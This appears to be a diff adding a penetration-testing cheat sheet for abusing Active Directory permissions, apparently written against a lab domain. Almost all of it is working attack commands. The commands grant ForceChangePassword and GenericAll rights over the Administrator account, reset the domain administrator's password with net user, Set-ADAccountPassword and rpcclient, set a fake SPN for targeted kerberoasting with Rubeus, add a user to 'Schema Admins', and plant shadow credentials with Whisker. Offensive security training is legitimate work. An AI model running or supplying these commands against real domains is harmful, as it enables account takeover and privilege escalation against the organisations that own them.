@@ -1,0 +1,52 @@
+# ForceChangePassword
+```
+GUID: 00299570-246d-11d0-a768-00aa006e0529
+
+# Add ForceChangePassword ExtendedRights
+Add-DomainObjectAcl -TargetIdentity Administrator -PrincipalIdentity jkimmich -Rights ResetPassword
+
+# All User
+Get-DomainObjectAcl | Where-Object {$_.ObjectAceType -match "00299570-246d-11d0-a768-00aa006e0529"} | Select SecurityIdentifier,ObjectAceType | Out-GridView
+
+# Specific User
+Get-DomainObjectAcl  -Identity Administrator | Where-Object {$_.ObjectAceType -match "00299570-246d-11d0-a768-00aa006e0529"} | Select SecurityIdentifier,ObjectAceType | Out-GridView
+
+# Change Password
+net user Administrator YeniSifre123! /domain
+Set-ADAccountPassword -Identity "Administrator" -NewPassword (ConvertTo-SecureString "NewPassword123!" -AsPlainText -Force) -Reset
+
+# Change Password with RPC
+rpcclient $> setuserinfo2 Administrator 24 'NewPassword123!'
+```
+
+# GenericAll
+```
+AccessMask = 0x000f01ff ( 983551 )
+
+# Add GenericAll
+Add-DomainObjectAcl -TargetIdentity Administrator -PrincipalIdentity jkimmich -Rights All
+
+# All user
+Get-DomainObjectAcl | Where-Object {$_.ActiveDirectoryRights -eq "GenericAll"} | Select-Object @{Name="PrincipalName"; Expression={Convert-SidToName $_.SecurityIdentifier}},@{Name="ObjectSid"; Expression={Convert-SidToName $_.ObjectSid}},ActiveDirectoryRights -Unique
+
+# Specific User
+Get-DomainObjectAcl -Identity jkimmich | Where-Object {$_.ActiveDirectoryRights -eq "GenericAll"} | Select-Object @{Name="PrincipalName"; Expression={Convert-SidToName $_.SecurityIdentifier}},ActiveDirectoryRights -Unique
+
+# Change Password
+net user Administrator YeniSifre123! /domain
+Set-ADAccountPassword -Identity "Administrator" -NewPassword (ConvertTo-SecureString "NewPassword123!" -AsPlainText -Force) -Reset
+
+# Targeted Kerberos
+Set-DomainObject -Identity jkimmich -Set @{serviceprincipalname='pentest/Oxsium'}
+.\Rubeus.exe kerberoast /user:jkimmich /nowrap
+
+# Add to Group ( GenericAll on "Schema Admins" group )
+Add-DomainGroupMember -Identity "Schema Admins" -Members "jkimmich"
+net group "Schema Admins" jkimmich /add /domain
+
+# DACL Abuse
+Add-DomainObjectAcl -TargetIdentity jkimmich -PrincipalIdentity User_B -Rights GenericAll
+
+# Shadow Credentials
+.\Whisker.exe add /target:jkimmich /domain:warzone.oxsium.local /dc:WIN-WARZONE.warzone.oxsium.local
+```
